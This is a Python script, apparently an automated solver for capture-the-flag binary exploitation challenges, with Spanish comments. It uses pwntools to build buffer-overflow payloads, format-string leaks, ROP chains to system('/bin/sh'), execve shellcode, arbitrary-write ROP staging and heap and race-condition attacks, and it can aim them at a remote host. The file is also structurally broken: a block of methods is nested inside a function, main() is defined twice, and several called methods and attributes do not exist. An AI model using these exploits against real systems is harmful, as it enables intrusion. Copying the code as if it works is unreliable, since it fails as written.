#!/usr/bin/env python3
"""
Advanced PWN Solver - Enhanced tool based on MindCrafters writeups
Automatically solves complex PWN challenges using advanced techniques
"""

import os
import sys
import re
import time
import struct
import subprocess
import threading
from pwn import *
import google.generativeai as genai

class AdvancedPWNSolver:
    def __init__(self, gemini_api_key=None):
        self.gemini_api_key = gemini_api_key
        self.binary_path = None
        self.process = None
        self.remote_conn = None
        self.target = None
        self.binary_info = {}
        self.leaked_addresses = {}
        self.gadgets = {}
        self.exploits_generated = []
        
        # Advanced exploitation techniques
        self.advanced_techniques = [
            "utf8_byte_bypass",
            "format_string_leak_exploit", 
            "custom_shellcode_injection",
            "stack_pivot_rop",
            "multi_stage_exploitation",
            "heap_feng_shui",
            "ret2dlresolve",
            "sigrop_exploitation",
            "advanced_race_conditions",
            "python_char_vs_byte_bypass"
        ]
        
        if gemini_api_key:
            self.setup_gemini()
    
    def setup_gemini(self):
        """Configurar Gemini AI"""
        try:
            genai.configure(api_key=self.gemini_api_key)
            self.model = genai.GenerativeModel('gemini-pro')
            print("[+] Gemini AI configurado")
        except Exception as e:
            print(f"[-] Error configurando Gemini: {e}")
            self.model = None
    
    def analyze_binary_comprehensive(self, binary_path):
        """Análisis completo del binario"""
        print(f"🔍 Analizando binario: {binary_path}")
        self.binary_path = binary_path
        
        try:
            # Análisis con pwntools
            elf = ELF(binary_path)
            self.binary_info = {
                'arch': elf.arch,
                'bits': elf.bits,
                'endian': elf.endian,
                'nx': elf.nx,
                'canary': elf.canary,
                'pie': elf.pie,
                'relro': elf.relro,
                'entry': elf.entry,
                'symbols': dict(elf.symbols),
                'got': dict(elf.got),
                'plt': dict(elf.plt)
            }
            
            print(f"[+] Arquitectura: {elf.arch} ({elf.bits}-bit)")
            print(f"[+] Protecciones: NX={elf.nx}, Canary={elf.canary}, PIE={elf.pie}, RELRO={elf.relro}")
            
            # Análisis de strings
            self.extract_strings(binary_path)
            
            # Análisis de funciones vulnerables
            self.detect_vulnerable_functions(binary_path)
            
            # Buscar gadgets ROP
            self.find_rop_gadgets(binary_path)
            
            return True
            
        except Exception as e:
            print(f"[-] Error analizando binario: {e}")
            return False
    
    def extract_strings(self, binary_path):
        """Extraer strings del binario"""
        try:
            result = subprocess.run(['strings', binary_path], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                strings = result.stdout.split('\n')
                self.binary_info['strings'] = [s for s in strings if len(s) > 3][:100]
                
                # Buscar flags en strings
                flag_patterns = [
                    r'[A-Z0-9_]+\{[^}]+\}',
                    r'flag\{[^}]+\}',
                    r'FLAG\{[^}]+\}',
                    r'L3AK\{[^}]+\}',
                    r'CTF\{[^}]+\}'
                ]
                
                for string in strings:
                    for pattern in flag_patterns:
                        matches = re.findall(pattern, string, re.IGNORECASE)
                        if matches:
                            print(f"🚩 FLAG ENCONTRADA EN STRINGS: {matches[0]}")
                            
        except Exception as e:
            print(f"[-] Error extrayendo strings: {e}")
    
    def detect_vulnerable_functions(self, binary_path):
        """Detectar funciones vulnerables"""
        vulnerable_funcs = [
            'gets', 'strcpy', 'strcat', 'sprintf', 'scanf', 'vsprintf',
            'system', 'exec', 'popen', 'printf', 'fprintf'
        ]
        
        found_vulns = []
        for func in vulnerable_funcs:
            if func in self.binary_info.get('symbols', {}):
                found_vulns.append(func)
                print(f"⚠️  Función vulnerable encontrada: {func}")
        
        self.binary_info['vulnerable_functions'] = found_vulns
    
    def find_rop_gadgets(self, binary_path):
        """Buscar gadgets ROP usando ROPgadget"""
        try:
            result = subprocess.run(['ROPgadget', '--binary', binary_path], 
                                  capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                gadgets_text = result.stdout
                
                # Parsear gadgets importantes
                important_gadgets = {
                    'pop_rdi': r'pop rdi.*ret',
                    'pop_rsi': r'pop rsi.*ret',
                    'pop_rdx': r'pop rdx.*ret',
                    'pop_rax': r'pop rax.*ret',
                    'syscall': r'syscall',
                    'ret': r'^.*ret$'
                }
                
                for gadget_name, pattern in important_gadgets.items():
                    matches = re.findall(f'(0x[0-9a-f]+).*{pattern}', gadgets_text, re.IGNORECASE | re.MULTILINE)
                    if matches:
                        self.gadgets[gadget_name] = int(matches[0], 16)
                        print(f"[+] Gadget {gadget_name}: {matches[0]}")
                        
        except Exception as e:
            print(f"[-] Error buscando gadgets: {e}")
    
    def connect_target(self, host=None, port=None, local_binary=None):
        """Conectar al objetivo (local o remoto)"""
        try:
            if host and port:
                self.target = remote(host, port)
                print(f"[+] Conectado a {host}:{port}")
            elif local_binary:
                self.target = process(local_binary)
                print(f"[+] Proceso local iniciado: {local_binary}")
            else:
                print("[-] Especifica host/port o binario local")
                return False
            return True
        except Exception as e:
            print(f"[-] Error conectando: {e}")
            return False
    
    def solve_buffer_overflow_basic(self, offset=None):
        """Resolver buffer overflow básico"""
        print("🔧 Intentando resolver buffer overflow básico...")
        
        if not offset:
            offset = self.find_buffer_overflow_offset()
        
        if not offset:
            print("[-] No se pudo encontrar offset")
            return False
        
        # Buscar dirección de win function o similar
        win_func = None
        for symbol, addr in self.binary_info.get('symbols', {}).items():
            if 'win' in symbol.lower() or 'flag' in symbol.lower() or 'shell' in symbol.lower():
                win_func = addr
                print(f"[+] Función objetivo encontrada: {symbol} @ {hex(addr)}")
                break
        
        if win_func:
            payload = b"A" * offset + p64(win_func)
            return self.send_payload_and_check(payload)
        
        return False
    
    def solve_format_string_vulnerability(self):
        """Resolver vulnerabilidad de format string"""
        print("🔧 Intentando resolver format string...")
        
        # Probar diferentes offsets para format string
        for offset in range(1, 20):
            try:
                if self.target:
                    self.target.close()
                
                self.connect_target(local_binary=self.binary_path)
                
                # Enviar payload de format string
                payload = f"%{offset}$p".encode()
                self.target.sendline(payload)
                
                response = self.target.recv(timeout=2)
                if b'0x' in response:
                    leaked_addr = re.search(rb'0x[0-9a-f]+', response)
                    if leaked_addr:
                        addr = int(leaked_addr.group().decode(), 16)
                        print(f"[+] Leak en offset {offset}: {hex(addr)}")
                        self.leaked_addresses[f'format_string_{offset}'] = addr
                        
                        # Intentar usar la dirección leaked
                        if self.exploit_with_leaked_address(addr):
                            return True
                            
            except Exception as e:
                continue
        
        return False
    
    def solve_rop_chain_exploit(self):
        """Resolver usando cadena ROP"""
        print("🔧 Intentando resolver con cadena ROP...")
        
        if not self.gadgets:
            print("[-] No se encontraron gadgets ROP")
            return False
        
        # Buscar /bin/sh string
        binsh_addr = None
        try:
            elf = ELF(self.binary_path)
            binsh_search = list(elf.search(b'/bin/sh'))
            if binsh_search:
                binsh_addr = binsh_search[0]
                print(f"[+] /bin/sh encontrado en: {hex(binsh_addr)}")
        except:
            pass
        
        # Construir cadena ROP básica
        if 'pop_rdi' in self.gadgets and 'system' in self.binary_info.get('symbols', {}):
            offset = self.find_buffer_overflow_offset()
            if offset:
                payload = b"A" * offset
                payload += p64(self.gadgets['pop_rdi'])
                payload += p64(binsh_addr or 0x404040)  # Dirección de /bin/sh
                payload += p64(self.binary_info['symbols']['system'])
                
                return self.send_payload_and_check(payload)
        
        return False
    
    def solve_multithreaded_challenge(self):
        """Resolver desafío con threads (como Chunky Threads)"""
        print("🔧 Intentando resolver desafío multithreaded...")
        
        try:
            # Configurar threads
            self.target.sendlineafter(b'CHUNK 1', b'CHUNKS 10')
            
            # Primer chunk para leak
            chunk1 = b'CHUNK 10000 1 ' + b'a' * 72
            self.target.sendlineafter(b'set nthread to 10', chunk1)
            self.target.recvlines(2)
            
            # Recibir leak
            leak = b'\x00' + self.target.recvline().strip()
            print(f"[+] Thread leak recibido: {leak.hex()}")
            
            # Extraer canary y dirección libc
            canary = u64(leak[:8])
            libc_address = u64(leak[8:] + b'\x00' * (8 - len(leak[8:]))) + 0x4090
            
            print(f"[+] Canary: {hex(canary)}")
            print(f"[+] Libc base: {hex(libc_address)}")
            
            # Construir ROP chain con libc
            rop_payload = self.build_libc_rop_chain(canary, libc_address)
            if rop_payload:
                chunk2 = b'CHUNK 1 1 ' + b'a' * 72 + rop_payload
                self.target.sendline(chunk2)
                return True
                
        except Exception as e:
            print(f"[-] Error en desafío multithreaded: {e}")
        
        return False
    
    def solve_arbitrary_write_challenge(self):
        """Resolver desafío de escritura arbitraria (como Go Write Where)"""
        print("🔧 Intentando resolver desafío de escritura arbitraria...")
        
        try:
            # Buscar dirección del contador de loop
            base_start = 0xc000000000
            base_end = 0xc0001ff000
            suffix = 0xdb8
            
            found_addr = None
            
            for base in range(base_start, base_end + 1, 0x1000):
                addr = base + suffix
                addr_str = f"0x{addr:x}".encode()
                
                try:
                    # Intentar escribir 0xff en la dirección
                    self.target.sendlineafter(b'Read or Write? (r/w):', b'w')
                    self.target.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', addr_str)
                    self.target.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0xff')
                    
                    response = self.target.recv(timeout=2)
                    
                    if b'Read or Write?' in response:
                        print(f"[+] Dirección correcta encontrada: {addr_str.decode()}")
                        found_addr = addr_str
                        break
                        
                except:
                    continue
            
            if found_addr:
                return self.exploit_arbitrary_write(found_addr)
                
        except Exception as e:
            print(f"[-] Error en desafío de escritura arbitraria: {e}")
        
        return False
    
    def solve_unicode_bypass(self):
        """Resolver bypass usando caracteres Unicode (como Safe Gets)"""
        print("🔧 Intentando bypass Unicode...")
        
        try:
            # Carácter Unicode que ocupa múltiples bytes
            unicode_char = "ⓣ".encode('utf-8')  # 3 bytes
            
            # Crear payload que bypasse límite de caracteres
            offset = self.find_buffer_overflow_offset() or 200
            win_func = None
            
            for symbol, addr in self.binary_info.get('symbols', {}).items():
                if 'win' in symbol.lower():
                    win_func = addr + 5  # Saltar prólogo
                    break
            
            if win_func:
                payload = unicode_char * 30 + b'\x00' * 190 + p64(win_func)
                return self.send_payload_and_check(payload)
                
        except Exception as e:
            print(f"[-] Error en bypass Unicode: {e}")
        
        return False
    
    def build_libc_rop_chain(self, canary, libc_base):
        """Construir cadena ROP con libc"""
        try:
            # Offsets comunes de libc (pueden variar)
            system_offset = 0x50d60
            binsh_offset = 0x1d8698
            pop_rdi_offset = 0x2a3e5
            ret_offset = 0x29cd6
            
            system_addr = libc_base + system_offset
            binsh_addr = libc_base + binsh_offset
            pop_rdi = libc_base + pop_rdi_offset
            ret_gadget = libc_base + ret_offset
            
            # Construir payload
            payload = p64(canary) + p64(0)  # Canary + saved RBP
            payload += p64(ret_gadget)      # Stack alignment
            payload += p64(pop_rdi)         # pop rdi; ret
            payload += p64(binsh_addr)      # /bin/sh address
            payload += p64(system_addr)     # system()
            
            return payload
            
        except Exception as e:
            print(f"[-] Error construyendo ROP chain: {e}")
            return None
    
    def exploit_arbitrary_write(self, loop_counter_addr):
        """Explotar escritura arbitraria"""
        try:
            # Escribir /bin/sh en memoria
            binsh = b"/bin/sh\x00"
            base_addr = 0x52c010
            
            for i, byte_val in enumerate(binsh):
                addr = f"0x{base_addr + i:x}".encode()
                self.target.sendlineafter(b'Read or Write? (r/w):', b'w')
                self.target.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', addr)
                self.target.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', f"0x{int(byte_val):02x}".encode())
                self.target.recvuntil(b'Wrote')
            
            # Construir cadena ROP
            stack_base = int(loop_counter_addr, 16) + 0x190
            
            # Gadgets (deben ser encontrados para el binario específico)
            gadgets = {
                'POP_RAX': 0x4224c4,
                'POP_RDI': 0x46b3e6,
                'POP_RDX': 0x4742ca,
                'SYSCALL': 0x463aa9
            }
            
            # ROP chain para execve("/bin/sh", 0, 0)
            rop_chain = [
                (stack_base + 0x00, gadgets['POP_RDI']),
                (stack_base + 0x08, base_addr),
                (stack_base + 0x10, gadgets['POP_RAX']),
                (stack_base + 0x18, 59),  # execve syscall
                (stack_base + 0x20, gadgets['POP_RDX']),
                (stack_base + 0x28, 0x0),
                (stack_base + 0x30, gadgets['SYSCALL'])
            ]
            
            # Escribir ROP chain byte por byte
            for addr, value in rop_chain:
                for i in range(8):
                    byte_val = (value >> (i * 8)) & 0xff
                    self.target.sendlineafter(b'Read or Write? (r/w):', b'w')
                    self.target.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', f"0x{addr + i:x}".encode())
                    self.target.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', f"0x{byte_val:02x}".encode())
                    self.target.recvuntil(b'Wrote')
            
            # Trigger ROP chain
            self.target.sendlineafter(b'Read or Write? (r/w):', b'w')
            self.target.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', loop_counter_addr)
            self.target.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0x1')
            
            return True
            
        except Exception as e:
            print(f"[-] Error en exploit de escritura arbitraria: {e}")
            return False
    
    def find_buffer_overflow_offset(self):
        """Encontrar offset para buffer overflow"""
        try:
            pattern = cyclic(300)
            
            # Crear proceso temporal
            temp_process = process(self.binary_path)
            temp_process.sendline(pattern)
            temp_process.wait()
            
            # Analizar core dump
            core = temp_process.corefile
            if core:
                crash_addr = core.read(core.rsp, 8)
                offset = cyclic_find(crash_addr)
                print(f"[+] Offset encontrado: {offset}")
                return offset
                
        except Exception as e:
            print(f"[-] Error encontrando offset: {e}")
        
        return None
    
    def send_payload_and_check(self, payload):
        """Enviar payload y verificar éxito"""
        try:
            self.target.sendline(payload)
            
            # Verificar si obtenemos shell
            self.target.sendline(b'echo "SHELL_TEST"')
            response = self.target.recv(timeout=3)
            
            if b'SHELL_TEST' in response:
                print("🎉 ¡SHELL OBTENIDA!")
                return True
            
            # Buscar flags en la respuesta
            flag_patterns = [
                rb'[A-Z0-9_]+\{[^}]+\}',
                rb'flag\{[^}]+\}',
                rb'FLAG\{[^}]+\}',
                rb'L3AK\{[^}]+\}'
            ]
            
            for pattern in flag_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                if matches:
                    print(f"🚩 FLAG ENCONTRADA: {matches[0].decode()}")
                    return True
            
        except Exception as e:
            print(f"[-] Error enviando payload: {e}")
        
        return False
    
    def exploit_with_leaked_address(self, leaked_addr):
        """Intentar exploit usando dirección filtrada"""
        try:
            # Calcular posibles direcciones base
            possible_bases = [
                leaked_addr & 0xfffffffffffff000,  # Page alignment
                leaked_addr - 0x1000,
                leaked_addr - 0x2000,
            ]
            
            for base in possible_bases:
                # Intentar diferentes offsets comunes
                common_offsets = [0x0, 0x10, 0x20, 0x50, 0x100]
                
                for offset in common_offsets:
                    target_addr = base + offset
                    payload = b"A" * 64 + p64(target_addr)
                    
                    if self.send_payload_and_check(payload):
                        return True
                        
        except Exception as e:
            print(f"[-] Error explotando con dirección filtrada: {e}")
        
        return False
    
    def auto_solve_challenge(self, binary_path, host=None, port=None):
        """Resolver desafío automáticamente"""
        print("🤖 INICIANDO RESOLUCIÓN AUTOMÁTICA")
        print("=" * 50)
        
        # Analizar binario
        if not self.analyze_binary_comprehensive(binary_path):
            return False
        
        # Conectar al objetivo
        if not self.connect_target(host, port, binary_path):
            return False
        
        # Intentar diferentes técnicas de explotación
        techniques = [
            ("Buffer Overflow Básico", self.solve_buffer_overflow_basic),
            ("Format String", self.solve_format_string_vulnerability),
            ("Cadena ROP", self.solve_rop_chain_exploit),
            ("Bypass Unicode", self.solve_unicode_bypass),
            ("Desafío Multithreaded", self.solve_multithreaded_challenge),
            ("Escritura Arbitraria", self.solve_arbitrary_write_challenge)
        ]
        
        for technique_name, technique_func in techniques:
            print(f"\n🔄 Probando técnica: {technique_name}")
            try:
                if technique_func():
                    print(f"✅ ¡Éxito con {technique_name}!")
                    return True
                else:
                    print(f"❌ {technique_name} falló")
            except Exception as e:
                print(f"❌ Error en {technique_name}: {e}")
            
            # Reconectar para próximo intento
            try:
                if self.target:
                    self.target.close()
                self.connect_target(host, port, binary_path)
            except:
                pass
        
        print("❌ No se pudo resolver el desafío automáticamente")
        return False

def main():
    """Función principal"""
    if len(sys.argv) < 2:
        print("Uso: python advanced_pwn_solver.py <binary> [host] [port] [gemini_key]")
        print("\nEjemplos:")
        print("  python advanced_pwn_solver.py ./chall")
        print("  python advanced_pwn_solver.py ./chall 127.0.0.1 1337")
        print("  python advanced_pwn_solver.py ./chall 127.0.0.1 1337 AIzaSyC...")
        return
    
    binary_path = sys.argv[1]
    host = sys.argv[2] if len(sys.argv) > 2 else None
    port = int(sys.argv[3]) if len(sys.argv) > 3 else None
    gemini_key = sys.argv[4] if len(sys.argv) > 4 else None
    
    # Crear solver
    solver = AdvancedPWNSolver(gemini_api_key=gemini_key)
    
    # Resolver desafío
    success = solver.auto_solve_challenge(binary_path, host, port)
    
    if success:
        print("\n🎉 ¡DESAFÍO RESUELTO EXITOSAMENTE!")
        if solver.target:
            solver.target.interactive()
    else:
        print("\n❌ No se pudo resolver el desafío")

    def utf8_byte_bypass_technique(self, max_chars=255):
        """
        Técnica UTF-8 Byte Bypass de MindCrafters (Safe Gets Challenge)
        Explota diferencia entre caracteres y bytes en Python
        """
        print("[+] Aplicando técnica UTF-8 Byte Bypass...")
        
        try:
            # Carácter UTF-8 que ocupa 3 bytes pero cuenta como 1 carácter
            t_in_circle_utf8 = "ⓣ".encode("utf-8")  # 3 bytes
            
            # Calcular payload que excede límite de bytes
            utf8_chars = 30  # Usar 30 caracteres UTF-8 (90 bytes)
            null_bytes = 190  # Rellenar con nulls
            
            payload = t_in_circle_utf8 * utf8_chars
            payload += b'\x00' * null_bytes
            
            # Agregar dirección de win function si existe
            if 'win' in self.binary_info.get('symbols', {}):
                win_addr = self.binary_info['symbols']['win']
                payload += p64(win_addr + 5)  # +5 para saltar prólogo
                print(f"[+] Usando win function: {hex(win_addr)}")
            
            print(f"[+] Payload UTF-8: {len(payload)} bytes, ~{utf8_chars} caracteres")
            return payload
            
        except Exception as e:
            print(f"[-] Error en UTF-8 bypass: {e}")
            return None
    
    def format_string_leak_and_exploit(self):
        """
        Técnica Format String con leak y explotación (The Goose Challenge)
        """
        print("[+] Aplicando Format String Leak & Exploit...")
        
        try:
            if not self.target:
                return None
            
            # Fase 1: Leak de dirección del stack
            format_payload = f"%{1}$p".encode()
            self.target.sendlineafter(b"name", format_payload)
            
            recv_data = self.target.recv()
            match = re.search(rb'0x[0-9a-fA-F]+', recv_data)
            
            if match:
                leaked_addr = int(match.group(0), 16)
                print(f"[+] Stack leak: {hex(leaked_addr)}")
                
                # Calcular dirección de shellcode
                shellcode_addr = leaked_addr + 0x52 + 8
                
                # Generar shellcode personalizado
                shellcode = self.generate_custom_shellcode()
                
                # Buffer overflow con dirección calculada
                payload = b'A' * 72
                payload += p64(shellcode_addr)
                payload += shellcode
                
                return payload
            
        except Exception as e:
            print(f"[-] Error en format string exploit: {e}")
            return None
    
    def generate_custom_shellcode(self):
        """Generar shellcode personalizado optimizado"""
        print("[+] Generando shellcode personalizado...")
        
        # Shellcode para execve("/bin/sh", NULL, NULL)
        shellcode = asm("""
            xor rax, rax
            push rax
            mov rbx, 0x68732f2f6e69622f
            push rbx
            mov rdi, rsp
            push rax
            push rdi
            mov rsi, rsp
            mov rdx, rax
            mov rax, 59
            syscall
        """)
        
        return shellcode
    
    def detect_mindcrafters_challenge_type(self):
        """
        Detectar tipo de desafío específico de MindCrafters
        """
        print("[+] Detectando tipo de desafío MindCrafters...")
        
        challenge_patterns = {
            "safe_gets_utf8": [b"max", b"255", b"bytes", b"character", b"input"],
            "the_goose_format": [b"honk", b"printf", b"name", b"guess"],
            "heap_challenge": [b"malloc", b"free", b"chunk", b"heap"],
            "rop_challenge": [b"system", b"/bin/sh", b"gadget", b"rop"],
            "race_condition": [b"thread", b"pthread", b"concurrent", b"race"]
        }
        
        detected_types = []
        
        try:
            # Analizar strings del binario
            result = subprocess.run(
                ['strings', self.binary_path],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                binary_strings = result.stdout.lower().encode()
                
                for challenge_type, patterns in challenge_patterns.items():
                    matches = sum(1 for pattern in patterns if pattern in binary_strings)
                    if matches >= 2:  # Al menos 2 patrones coinciden
                        detected_types.append((challenge_type, matches))
                
                # Ordenar por número de coincidencias
                detected_types.sort(key=lambda x: x[1], reverse=True)
                
                if detected_types:
                    best_match = detected_types[0][0]
                    print(f"[+] Tipo detectado: {best_match}")
                    return best_match
        
        except Exception as e:
            print(f"[-] Error en detección: {e}")
        
        return "unknown"
    
    def apply_mindcrafters_technique(self, challenge_type):
        """
        Aplicar técnica específica según el tipo de desafío detectado
        """
        print(f"[+] Aplicando técnica para: {challenge_type}")
        
        techniques_map = {
            "safe_gets_utf8": self.utf8_byte_bypass_technique,
            "the_goose_format": self.format_string_leak_and_exploit,
            "heap_challenge": self.heap_feng_shui_technique,
            "race_condition": lambda: self.advanced_race_condition_exploit()[0],
            "unknown": self.multi_stage_exploitation
        }
        
        technique_func = techniques_map.get(challenge_type, self.multi_stage_exploitation)
        
        try:
            result = technique_func()
            if result:
                print(f"[+] Técnica {challenge_type} aplicada exitosamente")
                return result
            else:
                print(f"[-] Técnica {challenge_type} falló")
                return None
        except Exception as e:
            print(f"[-] Error aplicando técnica {challenge_type}: {e}")
            return None
    
    def heap_feng_shui_technique(self):
        """
        Técnica Heap Feng Shui para manipulación controlada del heap
        """
        print("[+] Aplicando Heap Feng Shui...")
        
        try:
            # Preparar layout del heap
            chunk_sizes = [0x20, 0x30, 0x40, 0x50, 0x60]
            
            # Fase 1: Allocar chunks con tamaños específicos
            for i, size in enumerate(chunk_sizes):
                payload = f"alloc {size}".encode()
                self.target.sendline(payload)
                print(f"[+] Allocated chunk {i}: {size} bytes")
            
            # Fase 2: Crear fragmentación controlada
            for i in range(0, len(chunk_sizes), 2):
                payload = f"free {i}".encode()
                self.target.sendline(payload)
                print(f"[+] Freed chunk {i}")
            
            # Fase 3: Explotar fragmentación
            exploit_size = 0x38
            exploit_payload = b'A' * 0x18
            exploit_payload += p64(0x41)      # Fake chunk size
            exploit_payload += p64(0x602060)  # Target address (GOT entry)
            
            self.target.sendline(f"alloc {exploit_size}".encode())
            self.target.sendline(exploit_payload)
            
            print("[+] Heap feng shui aplicado")
            return True
            
        except Exception as e:
            print(f"[-] Error en heap feng shui: {e}")
            return False
    
    def advanced_race_condition_exploit(self, num_threads=50):
        """
        Explotación avanzada de race conditions con timing preciso
        """
        print(f"[+] Aplicando race condition con {num_threads} threads...")
        
        class RaceExploiter:
            def __init__(self, binary_path):
                self.binary_path = binary_path
                self.success = False
                self.result = None
                self.lock = threading.Lock()
            
            def worker_thread(self, thread_id):
                try:
                    p = process(self.binary_path)
                    
                    # Timing crítico específico
                    time.sleep(0.0001 * thread_id)
                    
                    # Payload específico para race condition
                    race_payload = f"race_thread_{thread_id}".encode()
                    p.sendline(race_payload)
                    
                    response = p.recvall(timeout=1)
                    
                    with self.lock:
                        if b"flag" in response.lower() or b"success" in response.lower():
                            self.success = True
                            self.result = response
                            print(f"[!] Race condition exitosa en thread {thread_id}")
                    
                    p.close()
                    
                except Exception:
                    pass  # Silenciar errores individuales
        
        exploiter = RaceExploiter(self.binary_path)
        threads = []
        
        # Lanzar threads concurrentes
        for i in range(num_threads):
            t = threading.Thread(target=exploiter.worker_thread, args=(i,))
            threads.append(t)
            t.start()
        
        # Esperar resultados
        for t in threads:
            t.join()
        
        return exploiter.success, exploiter.result
def main():
    """Función principal mejorada con técnicas de MindCrafters"""
    print("🚀 ADVANCED PWN SOLVER - Técnicas de MindCrafters")
    print("="*50)
    
    if len(sys.argv) < 2:
        print("Uso: python advanced_pwn_solver.py <binary> [gemini_api_key]")
        print("\nEjemplos:")
        print("  python advanced_pwn_solver.py ./challenge")
        print("  python advanced_pwn_solver.py ./challenge AIzaSyC...")
        return
    
    binary_path = sys.argv[1]
    api_key = sys.argv[2] if len(sys.argv) > 2 else None
    
    solver = AdvancedPWNSolver(api_key)
    
    print(f"[+] Analizando binario: {binary_path}")
    print(f"[+] Técnicas disponibles: {len(solver.mindcrafters_techniques)}")
    
    # Análisis y explotación automática con técnicas de MindCrafters
    if solver.analyze_binary_comprehensive(binary_path):
        # Detectar tipo específico de desafío
        challenge_type = solver.detect_mindcrafters_challenge_type()
        
        # Aplicar técnica específica
        result = solver.apply_mindcrafters_technique(challenge_type)
        
        if result:
            print("\n🎯 Explotación exitosa con técnicas de MindCrafters!")
        else:
            print("\n❌ Explotación falló, intentando técnicas generales...")
            solver.auto_exploit()
    
    print("\n✅ Análisis completado!")

if __name__ == "__main__":
    main()